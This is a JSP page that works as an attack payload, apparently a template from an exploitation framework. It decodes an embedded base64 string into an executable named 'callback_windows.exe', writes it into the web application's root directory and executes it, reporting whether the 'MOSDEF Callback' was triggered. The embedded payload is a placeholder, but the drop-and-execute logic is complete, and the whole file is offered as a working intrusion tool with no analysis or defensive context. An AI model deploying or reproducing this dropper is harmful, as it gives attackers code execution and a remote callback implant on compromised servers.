<%@ page import="java.util.*,java.io.*"%>
<%@ page import="sun.misc.BASE64Decoder"%>

<HTML>
    <BODY>	
		<%	
            String b64exec = "QUIRK";
			String current_path = request.getSession().getServletContext().getRealPath("/");
            String fName = current_path + "callback_windows.exe";

			out.println("Current JSP path: " + current_path + "<p>");

            // Base64 decoding of the executable
            BASE64Decoder decoder = new BASE64Decoder();
            byte[] decodedBytes = decoder.decodeBuffer(b64exec);
            if (decodedBytes == null) {
                out.println("Decoding failed.");
            }

            // Writing the executable
            FileOutputStream fstream = new FileOutputStream(fName);
            fstream.write(decodedBytes);
            fstream.close();

            // Executing it
			try {    
				Process p = Runtime.getRuntime().exec(fName);
				out.println("MOSDEF Callback successfully triggered");
			}

			catch(Exception e){
				out.println("MOSDEF Callback execution failed!<p>");
                out.println(e);
			}


		%>
	</BODY>
</HTML>
